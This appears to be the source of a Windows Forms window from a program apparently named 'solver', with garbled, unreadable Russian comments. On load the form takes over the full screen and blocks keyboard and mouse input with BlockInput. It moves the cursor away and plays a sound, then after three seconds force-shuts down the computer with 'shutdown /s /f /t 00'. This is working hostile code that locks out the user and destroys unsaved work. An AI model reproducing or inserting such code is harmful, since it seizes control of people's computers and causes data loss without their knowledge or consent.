#include <windows.h>
#include <stdlib.h>
#include <winbase.h>
#include <Lmcons.h>
#include <fstream>
#include "propyski.h"
#pragma comment(lib, "user32") 
#pragma comment(lib, "Advapi32")
#pragma comment(lib, "winmm")

int width;
int height;
namespace solver {

	using namespace System;
	using namespace System::ComponentModel;
	using namespace System::Collections;
	using namespace System::Windows::Forms;
	using namespace System::Data;
	using namespace System::Drawing;

	/// <summary>
	/// ������ ��� final
	/// </summary>
	public ref class final : public System::Windows::Forms::Form
	{
	public:
		final(void)
		{
			InitializeComponent();
			//
			//TODO: �������� ��� ������������
			//
		}
	private: System::Windows::Forms::Timer^ timer1_4;
	private: System::Windows::Forms::PictureBox^ pictureBox1;
	public:
	private: bool first = true;
	protected:
		/// <summary>
		/// ���������� ��� ������������ �������.
		/// </summary>
		~final()
		{
			if (components)
			{
				delete components;
			}
		}
	private: System::ComponentModel::IContainer^ components;
	protected:

	protected:

	private:
		/// <summary>
		/// ������������ ���������� ������������.
		/// </summary>


#pragma region Windows Form Designer generated code
		/// <summary>
		/// ��������� ����� ��� ��������� ������������ � �� ��������� 
		/// ���������� ����� ������ � ������� ��������� ����.
		/// </summary>
		void InitializeComponent(void)
		{
			this->components = (gcnew System::ComponentModel::Container());
			System::ComponentModel::ComponentResourceManager^ resources = (gcnew System::ComponentModel::ComponentResourceManager(final::typeid));
			this->timer1_4 = (gcnew System::Windows::Forms::Timer(this->components));
			this->pictureBox1 = (gcnew System::Windows::Forms::PictureBox());
			(cli::safe_cast<System::ComponentModel::ISupportInitialize^>(this->pictureBox1))->BeginInit();
			this->SuspendLayout();
			// 
			// timer1_4
			// 
			this->timer1_4->Interval = 3000;
			this->timer1_4->Tick += gcnew System::EventHandler(this, &final::timer1_4_Tick);
			// 
			// pictureBox1
			// 
			this->pictureBox1->Anchor = static_cast<System::Windows::Forms::AnchorStyles>((((System::Windows::Forms::AnchorStyles::Top | System::Windows::Forms::AnchorStyles::Bottom)
				| System::Windows::Forms::AnchorStyles::Left)
				| System::Windows::Forms::AnchorStyles::Right));
			this->pictureBox1->BackgroundImage = (cli::safe_cast<System::Drawing::Image^>(resources->GetObject(L"pictureBox1.BackgroundImage")));
			this->pictureBox1->BackgroundImageLayout = System::Windows::Forms::ImageLayout::Stretch;
			this->pictureBox1->Location = System::Drawing::Point(0, 0);
			this->pictureBox1->Name = L"pictureBox1";
			this->pictureBox1->Size = System::Drawing::Size(718, 539);
			this->pictureBox1->TabIndex = 0;
			this->pictureBox1->TabStop = false;
			// 
			// final
			// 
			this->AutoScaleDimensions = System::Drawing::SizeF(6, 13);
			this->AutoScaleMode = System::Windows::Forms::AutoScaleMode::Font;
			this->BackColor = System::Drawing::Color::DarkBlue;
			this->ClientSize = System::Drawing::Size(718, 539);
			this->Controls->Add(this->pictureBox1);
			this->FormBorderStyle = System::Windows::Forms::FormBorderStyle::None;
			this->Icon = (cli::safe_cast<System::Drawing::Icon^>(resources->GetObject(L"$this.Icon")));
			this->Name = L"final";
			this->StartPosition = System::Windows::Forms::FormStartPosition::CenterScreen;
			this->Text = L"��������� \"�� � �����\"";
			this->TopMost = true;
			this->WindowState = System::Windows::Forms::FormWindowState::Maximized;
			this->Load += gcnew System::EventHandler(this, &final::final_Load);
			(cli::safe_cast<System::ComponentModel::ISupportInitialize^>(this->pictureBox1))->EndInit();
			this->ResumeLayout(false);

		}
	private: System::Void final_Click() {
		system("shutdown /s /f /t 00");
		Application::Exit();
	}
	private: System::Void timer1_4_Tick(System::Object^ sender, System::EventArgs^ e) {
		final_Click();
	}
	private: System::Void final_Load(System::Object^ sender, System::EventArgs^ e) {
		if (this->first) {
			System::Drawing::Size size = this->ClientSize;
			width = size.Width;
			height = size.Height;
			this->pictureBox1->Size = System::Drawing::Size(width, height);
			BlockInput(true);
			SetCursorPos(90000000, 90000000);
			this->first = false;
			PlaySound(MAKEINTRESOURCE(14), GetModuleHandle(NULL), SND_RESOURCE | SND_ASYNC);
			this->timer1_4->Start();
		}
	}
	};
}